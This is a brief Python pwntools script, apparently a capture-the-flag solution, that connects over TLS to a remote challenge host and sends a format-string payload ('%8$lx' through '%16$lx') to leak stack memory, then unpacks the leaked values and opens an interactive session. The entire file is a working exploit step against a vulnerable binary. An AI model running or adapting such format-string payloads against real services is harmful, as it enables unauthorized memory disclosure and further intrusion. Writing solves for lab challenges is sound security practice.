from pwn import *
import string


context.log_level = 'info'
context.arch = 'amd64'
context.os = 'linux'

gdb_script = f"""
continue
 """
# p = gdb.debug("./app", gdbscript=gdb_script)
# p = process("./app")
p = remote("inst-8zr56qqa3p.tls.vuln.si", 443, ssl=True)
RIP_offset = 19
p.sendline(f"%8$lx %9$lx %10$lx %11$lx %12$lx %13$lx %14$lx %15$lx %16$lx")
p.recvuntil("====\n")
resp = p.recvline().decode("utf-8")
# print(resp)
byts = resp.strip().split(' ')
for seg in byts:
    print(p64(int(seg, 16)))
# print(byts)
p.interactive()

